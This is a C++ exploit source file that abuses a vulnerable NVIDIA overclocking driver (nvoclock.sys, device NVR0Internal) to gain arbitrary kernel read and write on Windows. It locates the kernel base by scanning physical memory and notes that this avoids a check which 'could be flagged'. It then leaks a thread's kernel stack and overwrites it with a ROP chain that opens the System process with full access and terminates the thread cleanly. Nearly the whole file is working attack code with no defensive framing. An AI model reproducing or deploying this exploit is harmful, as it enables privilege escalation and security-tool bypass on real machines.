//#include <iostream>
//#include <windows.h>

#include "ntquery.h"

struct request_phys_addr
{
	int request_id;
	int unk_0;
	__int64 result_addr;
	__int64 virtual_addr;
	int writevalue;
	char unk[0x20 - 4];
	unsigned __int64 packet_key[0x40 / 8];
	char unk_data[0x138 - 0x40 - 56];
};

static int ioctl_code = 0x9C40A484;

struct request_phys_read
{
	int request_id;
	int size;
	__int64 dst_addr;
	__int64 src_addr;
	char unk[0x20];
	unsigned __int64 packet_key[0x40 / 8];
	char unk_data[0x138 - 0x40 - 56];
};

void* (*encrypt_payload_phys_read_write)(request_phys_read * data_crypt, int, void* temp_buf) = nullptr;
void* (*encrypt_payload_phys_request)(request_phys_addr* data_crypt, int, void* temp_buf) = nullptr;

BOOL read_physical_mem(HANDLE device, uintptr_t physical_address, void* OUT res, int size)
{

	request_phys_read Request{};

	Request.request_id = 0x14;
	Request.size = size;
	Request.dst_addr = (__int64)res;
	Request.src_addr = physical_address;

	encrypt_payload_phys_read_write(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(device , ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

}

BOOL write_physical_mem(HANDLE device, uintptr_t physical_address, void* IN  res, int size)
{

	request_phys_read Request{};

	Request.request_id = 0x15;
	Request.size = size;
	Request.dst_addr = physical_address;
	Request.src_addr = (__int64)res;

	encrypt_payload_phys_read_write(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(device, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

}

uintptr_t get_ntos_dirbase(HANDLE device)
{

	uintptr_t cr3 = 0;

	// find PROCESSOR_START_BLOCK
	// system cr3 value at offset 0xa0
	// nt!HalpLMStub address at offset 0x70
	// the letter can be used to extact the kernel base without enumeration of devices(could be flagged)

	for (int i = 0x1000; i < 0x1000000; i += 0x1000)
	{
		uintptr_t lpBuffer;

		if (!read_physical_mem(device, i, &lpBuffer, sizeof(uintptr_t)))
			continue;

		if ((lpBuffer & 0x00000000000000ff) == 0xe9)
		{

			read_physical_mem(device, i + 0xa0, &cr3, sizeof(uintptr_t));

			return cr3;
		}

	}

	return 0;
}

uintptr_t get_ntos_base(HANDLE device)
{

	uintptr_t cr3 = 0;

	// find PROCESSOR_START_BLOCK
	// nt!HalpLMStub address at offset 0x70
	// the letter can be used to extact the kernel base without enumeration of devices(could be flagged)

	for (int i = 0x1000; i < 0x1000000; i += 0x1000)
	{
		uintptr_t lpBuffer;

		if (!read_physical_mem(device, i, &lpBuffer, sizeof(uintptr_t)))
			continue;

		if ((lpBuffer & 0x00000000000000ff) == 0xe9)
		{

			uintptr_t HalpLMStub = 0;

			read_physical_mem(device, i + 0x70, &HalpLMStub, sizeof(uintptr_t));

			return (HalpLMStub - 0x3f3010);

		}

	}

	return 0;

}


uintptr_t MmGetPhysicalAddress(HANDLE device, uintptr_t virtual_address)
{
	request_phys_addr Request{};

	Request.request_id = 0x26;
	Request.result_addr = 0;
	Request.virtual_addr = virtual_address;

	encrypt_payload_phys_request(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};

	auto status = DeviceIoControl(device, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

	if (!status)
	{
		printf("[-] Failed VTOP for virtual address: %p!\n", (void*)virtual_address);

		return 0;
	}

	return Request.result_addr;
}

BOOL read_virtual_mem(HANDLE device, uintptr_t address, LPVOID output, unsigned long size)
{

	if (!address || !size)
		return FALSE;

	uintptr_t phys_addr = MmGetPhysicalAddress(device, address);

	if (!phys_addr)
		return FALSE;

	printf("[+] Physical address for the virtual address 0x%llx : 0x%llx\n", phys_addr, address);

	if (!read_physical_mem(device, phys_addr, output, size))
	{
		printf("[-] Failed ReadVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;
	}

	return TRUE;

}

BOOL write_virtual_mem(HANDLE device, uintptr_t address, LPVOID data, unsigned long size)
{
	if (!address || !data)
		return FALSE;

	uintptr_t phys_addr = MmGetPhysicalAddress(device, address);

	if (!phys_addr)
		return FALSE;

	if (!write_physical_mem(device, phys_addr, data, size))
	{

		printf("[-] Failed WriteVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;

	}
	return TRUE;
}


uintptr_t read_64_virtual_addr(HANDLE device, uintptr_t address)
{

	uint64_t output = 0;

	read_virtual_mem(device, address, &output, 8);

	return output;

}

void write_64_virtual_addr(HANDLE device, uintptr_t address, uint64_t data)
{

	uint64_t in_data = data;

	write_virtual_mem(device, address, &in_data, 8);

}

BOOL construct_chain(HANDLE inHandle, HANDLE dummyThread, ULONG64 KTHREAD, ULONG64 ntBase)
{

	ULONG64 kthreadstackBase = KTHREAD + 0x38;

	// Dereference KTHREAD.StackBase to leak the stack
	ULONG64 stackBase = read_64_virtual_addr(inHandle, kthreadstackBase);

	printf("[+] Leaked kernel-mode stack: 0x%llx\n", stackBase);

	ULONG64 retAddr = 0;

	for (int i = 0x8; i < 0x7000 - 0x8; i += 0x8)
	{

		ULONG64 value = read_64_virtual_addr(inHandle, stackBase - i);

		if ((value & 0xfffff00000000000) == 0xfffff00000000000)
		{

			if (value == ntBase + 0x3fb510)
			{

				printf("[+] Leaked target return address of nt!KiApcInterrupt!\n");

				retAddr = stackBase - i;

				break;
			}
		}

		value = 0;
	}

	printf("[+] Stack address: 0x%llx contains nt!KiApcInterrupt+0x328!\n", retAddr);

	///////////////////////////////////// rop chain to call psgetcurrentprocess

	//DWORD64 kernel_api_result = 0;

	//write_64_virtual_addr(inHandle, retAddr, ntBase + 0x2017f2);					// pop rax, ret
	//write_64_virtual_addr(inHandle, retAddr + 8, ntBase + 0x23a4b0);				// psgetcurrentprocess 00000000`0023a4b0
	//write_64_virtual_addr(inHandle, retAddr + 16, ntBase + 0x205a05);				// jmp rax
	//write_64_virtual_addr(inHandle, retAddr + 24, ntBase + 0x205dbc);				// pop rcx, ret
	//write_64_virtual_addr(inHandle, retAddr + 32, (DWORD64)&kernel_api_result);	// where the result will end up  
	//write_64_virtual_addr(inHandle, retAddr + 40, ntBase + 0x26d69a);				// mov [rcx], rax; ret

	//// at this point we want to kill the thread in a clean and graceful manner using zeterminatethread
	//// zeterminatethread(dummy_thread_handle, status_code_success = 0)

	//write_64_virtual_addr(inHandle, retAddr + 48, ntBase + 0x205dbc);				// pop rcx; ret
	//write_64_virtual_addr(inHandle, retAddr + 56, (DWORD64)dummyThread);			// handle to the dummy thread to pass to zwterminatethread

	//write_64_virtual_addr(inHandle, retAddr + 64, ntBase + 0x3ae022);				// pop rdx; ret
	//write_64_virtual_addr(inHandle, retAddr + 72, 0);								// set exit code to success

	//write_64_virtual_addr(inHandle, retAddr + 80, ntBase + 0x2017f2);				// pop rax; ret
	//write_64_virtual_addr(inHandle, retAddr + 88, ntBase + 0x3f4100);				// zwterminatethread

	//write_64_virtual_addr(inHandle, retAddr + 96, ntBase + 0x3ae023);				// just a  ret;	
	//write_64_virtual_addr(inHandle, retAddr + 104, ntBase + 0x205a05);				// jmp rax;


	/////////////////////////////////////////// rop chain to call PsLookupProcessByProcessId ///////////////////////////////////////////

	//DWORD64 eprocess_address = 0;

	//printf("[+] eprocess_address : 0x%llx", &eprocess_address);

	//write_64_virtual_addr(inHandle, retAddr,		ntBase + 0x205dbc);				// pop rcx, ret 
	//write_64_virtual_addr(inHandle, retAddr + 8,	0x1c0);							// target_proc_id
	//
	//write_64_virtual_addr(inHandle, retAddr + 16,	ntBase + 0x3ae022);				// pop rdx, ret 
	//write_64_virtual_addr(inHandle, retAddr + 24,	(DWORD64)&eprocess_address);	// output_res
	//
	//write_64_virtual_addr(inHandle, retAddr + 32,	ntBase + 0x2017f2);				// pop rax ret 
	//write_64_virtual_addr(inHandle, retAddr + 40,	ntBase + 0x666370);				// PsLookupProcessByProcessId
	//
	//write_64_virtual_addr(inHandle, retAddr + 48,	ntBase + 0x205a05);				// jmp rax

	// at this point we want to kill the thread in a clean and graceful manner using zeterminatethread
	// zeterminatethread(dummy_thread_handle, status_code_success = 0)
	
	// junk stuff. PsLookupProcessByProcessId stores some value on the stack outside of its stack

	//write_64_virtual_addr(inHandle, retAddr + 56, ntBase + 0x20b311);				// add rsp 0x18, ret
	//write_64_virtual_addr(inHandle, retAddr + 64, 0x4141414141414141);				// pop rcx; ret
	//write_64_virtual_addr(inHandle, retAddr + 72, 0x4141414141414141);				// pop rcx; ret

	//write_64_virtual_addr(inHandle, retAddr + 80, ntBase + 0x205dbc);				// junk to make up for stack fuck up by the called function
	//write_64_virtual_addr(inHandle, retAddr + 88, ntBase + 0x205dbc);				// handle to the dummy thread to pass to zwterminatethread
	//write_64_virtual_addr(inHandle, retAddr + 96, (DWORD64)dummyThread);			// handle to the dummy thread to pass to zwterminatethread

	//write_64_virtual_addr(inHandle, retAddr + 104, ntBase + 0x3ae022);				// pop rdx; ret
	//write_64_virtual_addr(inHandle, retAddr + 112, 0);								// set exit code to success

	//write_64_virtual_addr(inHandle, retAddr + 120, ntBase + 0x2017f2);				// pop rax; ret
	//write_64_virtual_addr(inHandle, retAddr + 128, ntBase + 0x3f4100);				// zwterminatethread

	//write_64_virtual_addr(inHandle, retAddr + 136, ntBase + 0x3ae023);				// just a  ret;	
	//write_64_virtual_addr(inHandle, retAddr + 144, ntBase + 0x205a05);				// jmp rax;

	//////////////// ROP to open process ////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	HANDLE systemprocHandle = NULL;

	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = ULongToHandle(4);
	clientId.UniqueThread = NULL;

	OBJECT_ATTRIBUTES objAttrs = { 0 };

	memset(&objAttrs, 0, sizeof(objAttrs));

	objAttrs.ObjectName = NULL;
	objAttrs.Length = sizeof(objAttrs);

	write_64_virtual_addr(inHandle, retAddr,		ntBase + 0x205dbc);				// 0x140a50296: pop rcx ; ret ; \x40\x59\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x8, (DWORD64)&systemprocHandle);		// HANDLE (to receive System process handle)
	write_64_virtual_addr(inHandle, retAddr + 0x10, ntBase + 0x3ae022);				// 0x14099493a: pop rdx ; ret ; \x5a\x46\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x18, PROCESS_ALL_ACCESS);			// PROCESS_ALL_ACCESS
	write_64_virtual_addr(inHandle, retAddr + 0x20, ntBase + 0x2017f1);				// 0x1402e8281: pop r8 ; ret ; \x41\x58\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x28, (DWORD64)&objAttrs);			// OBJECT_ATTRIBUTES

	
	// not found
	//write_64_virtual_addr(inHandle, retAddr + 0x30, ntBase + 0x42a123);				// 0x14042a123: pop r9 ; ret ; \x41\x59\xc3 (1 found)
	//write_64_virtual_addr(inHandle, retAddr + 0x38, (DWORD64)&clientId);			// CLIENT_ID
	//


	write_64_virtual_addr(inHandle, retAddr + 0x30, ntBase + 0xa0e317);				// pop r9; pop r10; pop r11; pop rbp; ret; 
	write_64_virtual_addr(inHandle, retAddr + 0x38, (DWORD64)&clientId);
	write_64_virtual_addr(inHandle, retAddr + 0x40, 0x4141414141414141);
	write_64_virtual_addr(inHandle, retAddr + 0x48, 0x4242424242424242);
	write_64_virtual_addr(inHandle, retAddr + 0x50, 0x4343434343434343);

	write_64_virtual_addr(inHandle, retAddr + 0x58, ntBase + 0x2017f2);				// 0x1406360a6: pop rax ; ret ; \x58\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x60, ntBase + 0x413210);				// nt!ZwOpenProcess
	write_64_virtual_addr(inHandle, retAddr + 0x68, ntBase + 0x205a05);				// 0x140ab533e: jmp rax; \x48\xff\xe0 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x70, ntBase + 0x205dbc);				// 0x140a50296: pop rcx ; ret ; \x40\x59\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x78, (ULONG64)dummyThread);			// HANDLE to the dummy thread
	write_64_virtual_addr(inHandle, retAddr + 0x80, ntBase + 0x3ae022);				// 0x14099493a: pop rdx ; ret ; \x5a\x46\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x88, 0x0000000000000000);			// Set exit code to STATUS_SUCCESS
	write_64_virtual_addr(inHandle, retAddr + 0x90, ntBase + 0x2017f2);				// 0x1406360a6: pop rax ; ret ; \x58\xc3 (1 found)
	write_64_virtual_addr(inHandle, retAddr + 0x98, ntBase + 0x3f4100);				// nt!ZwTerminateThread
	write_64_virtual_addr(inHandle, retAddr + 0xa0, ntBase + 0x205a05);				// 0x140ab533e: jmp rax; \x48\xff\xe0 (1 found)

	////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	printf("[+] Press any key to resume thread\n");
	getchar();

	// Resume the thread to kick off execution
	ResumeThread(dummyThread);

	Sleep(1000);

	printf("[+] Target eprocess address: 0x%llx\n", systemprocHandle);
	getchar();

exit:

	return (ULONG64)1;

}


int main()
{
    
	// Get handle to the driver
	HANDLE device = CreateFileW(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[+] Failed to get a handle to the device.\n");

		return -1;
	}
	else
	{
		printf("[+] Got a handle to the nv device\n");
	}

	HMODULE nvoclock = LoadLibraryW(L"C:\\users\\vls\\desktop\\nvoclock.sys");

	if (!nvoclock)
	{
		printf("[-] nvoclock.sys not found\n");
		return -1;
	}

	//	Get the payload encryption function sub_2130	
	encrypt_payload_phys_read_write = (decltype(encrypt_payload_phys_read_write))(__int64(nvoclock) + 0x2130);
	encrypt_payload_phys_request = (decltype(encrypt_payload_phys_request))(__int64(nvoclock) + 0x2130);

	BYTE test_buf[0x10] = {0};

	if (!read_physical_mem(device, 0x10000, test_buf, 0x10))
	{
		printf("[-] Physical memory read failed\n");
		return -1;
	}

	uint64_t ntos_base = get_ntos_base(device);

	printf("[+] ntos : 0x%llx\n", ntos_base);

	//uint64_t test2 = read_64_virtual_addr(device, 0xfffff78000000000);
	//write_64_virtual_addr(device, 0xfffff78000000000, 0x4142434445);

	HANDLE dummy_thread_handle = create_thread();

	printf("[+] Dummy thread handle: 0x%llx\n", dummy_thread_handle);

	ULONG64 kthread = find_kthread(dummy_thread_handle);

	construct_chain(device, dummy_thread_handle, kthread, ntos_base);

    return 0;

}


